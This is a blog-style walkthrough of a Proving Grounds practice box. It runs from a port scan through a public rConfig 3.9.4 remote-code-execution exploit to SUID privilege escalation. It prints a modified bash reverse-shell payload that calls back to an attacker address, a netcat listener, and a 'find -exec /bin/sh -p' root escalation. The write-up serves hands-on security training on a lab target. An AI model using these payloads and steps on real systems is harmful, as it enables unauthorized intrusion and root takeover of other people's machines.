---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Starting with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- -sV 192.168.126.57
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-12 16:57 EST
Nmap scan report for 192.168.126.57
Host is up (0.026s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB (unauthorized)
8081/tcp open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
Service Info: Host: QUACKERJACK; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
```

## port 21 (`ftp`)
> No `anonymous` login allowed.
{: .prompt-danger }

## port 139,445 (`smb`)
> No smb shares available.
{: .prompt-info }

## port 80 (web server)
A default landing page is visible.

## port 8081 (web server)
Installed software: `rConfig Version 3.9.4 `

---

# exploitation
## find an exploit
```bash
$ searchsploit rconfig 3.9.4
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
rConfig 3.9.4 - 'search.crud.php' Remote Command Injection                                                                                    | php/webapps/48241.py
rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote Code Execution                                                                      | php/webapps/48261.py
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

`rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote Code Execution` looks worth a try.

## customize exploit
The exploit does not trigger a reverse shell out of the box.  
The payload needs to be changed: ```payload = ''' `touch /tmp/.'''+fake_user+'''.txt;sudo zip -q /tmp/.'''+fake_user+'''.zip /tmp/.'''+fake_user+'''.txt -T -TT '/bin/sh -i>& /dev/tcp/{0}/{1} 0>&1 #'` '''.format(ip, port)```  
We are changing the payload variable to ```payload = ''' `bash -c 'bash -i >& /dev/tcp/192.168.49.126/8081 0>&1'` '''```

## start listener on attacker machine
```bash
$ nc -lvp 8081
listening on [any] 8081 ...
```

## execute exploit
```bash
$ python3 48261.py https://192.168.126.57:8081/ 192.168.49.126 8081
rConfig - 3.9 - Unauthenticated root RCE
[+] Adding a temporary admin user...
[+] Authenticating as syrmuxipft...
[+] Logged in successfully, triggering the payload...
[+] Check your listener !
[+] The reverse shell seems to be opened :-)
[+] Removing the temporary admin user...
[+] Done.
```

## catch connection from target
```bash
$ nc -lvp 8081
listening on [any] 8081 ...
192.168.126.57: inverse host lookup failed: Unknown host
connect to [192.168.49.126] from (UNKNOWN) [192.168.126.57] 41716
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
```

> We got a shell!
{: .prompt-info }

---

# post exploitation
## get first flag
```bash
bash-4.2$ cd home
cd home
bash-4.2$ ls
ls
rconfig
bash-4.2$ ls -lsah
ls -lsah
total 4.0K
   0 drwxr-xr-x.  3 root   root   21 Jun 22  2020 .
   0 dr-xr-xr-x. 17 root   root  244 Jun 25  2020 ..
4.0K drwxr-xr-x. 15 apache root 4.0K Jul  9  2020 rconfig
bash-4.2$ cd rconfig
cd rconfig
bash-4.2$ ls
ls
LICENSE
README.md
backups
classes
composer.json
composer.lock
config
cronfeed
data
lib
local.txt
logs
reports
templates
tmp
updates
vendor
www
bash-4.2$ cat local.txt
cat local.txt
3******************************5
```

## privilege escalation

Looking for binaries with `SUID` flag which are owned by `root`.

```bash
bash-4.2$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
/dev/nullype f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>  
-r-xr-sr-x. 1 root tty 15344 Jun  9  2014 /usr/bin/wall
-rwsr-xr-x. 1 root root 199304 Oct 30  2018 /usr/bin/find
-rwsr-xr-x. 1 root root 73888 Aug  8  2019 /usr/bin/chage
-rwsr-xr-x. 1 root root 78408 Aug  8  2019 /usr/bin/gpasswd
-rws--x--x. 1 root root 23968 Apr  1  2020 /usr/bin/chfn
-rws--x--x. 1 root root 23880 Apr  1  2020 /usr/bin/chsh
-rwsr-xr-x. 1 root root 41936 Aug  8  2019 /usr/bin/newgrp
-rwsr-xr-x. 1 root root 32128 Apr  1  2020 /usr/bin/su
---s--x--x. 1 root root 147336 Apr  1  2020 /usr/bin/sudo
-rwsr-xr-x. 1 root root 44264 Apr  1  2020 /usr/bin/mount
-rwsr-xr-x. 1 root root 31984 Apr  1  2020 /usr/bin/umount
-rwxr-sr-x. 1 root tty 19544 Apr  1  2020 /usr/bin/write
---x--s--x. 1 root nobody 382216 Aug  8  2019 /usr/bin/ssh-agent
-rwsr-xr-x. 1 root root 57656 Aug  8  2019 /usr/bin/crontab
-rwsr-xr-x. 1 root root 23576 Apr  1  2020 /usr/bin/pkexec
-rwsr-xr-x. 1 root root 27856 Mar 31  2020 /usr/bin/passwd
-rwsr-xr-x. 1 root root 32096 Oct 30  2018 /usr/bin/fusermount
-rwx--s--x. 1 root slocate 40520 Apr 10  2018 /usr/bin/locate
-rwsr-xr-x. 1 root root 36272 Apr  1  2020 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
-rwxr-sr-x. 1 root root 11224 Mar 31  2020 /usr/sbin/netreport
-rwsr-xr-x. 1 root root 11296 Mar 31  2020 /usr/sbin/usernetctl
-rwxr-sr-x. 1 root postdrop 218560 Apr  1  2020 /usr/sbin/postdrop
-rwxr-sr-x. 1 root postdrop 264128 Apr  1  2020 /usr/sbin/postqueue
-rwsr-xr-x. 1 root root 15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
-rwx--s--x. 1 root utmp 11192 Jun  9  2014 /usr/libexec/utempter/utempter
-rwsr-x---. 1 root dbus 58024 Mar 14  2019 /usr/libexec/dbus-1/dbus-daemon-launch-helper
---x--s--x. 1 root ssh_keys 465760 Aug  8  2019 /usr/libexec/openssh/ssh-keysign
```

Checking [gtfobins](https://gtfobins.github.io/gtfobins/find/#suid) shows that `find` can be used to elevate the privileges to `root`.

```bash
bash-4.2$ /usr/bin/find . -exec /bin/sh -p \; -quit     
/usr/bin/find . -exec /bin/sh -p \; -quit
sh-4.2# whoami
whoami
root
```

> Root! Root!
{: .prompt-info }

## get second flag
```bash
sh-4.2# cd /root
cd /root
sh-4.2# ls
ls
proof.txt
sh-4.2# cat proof.txt
cat proof.txt
6******************************5
```

Pwned! <@:-)
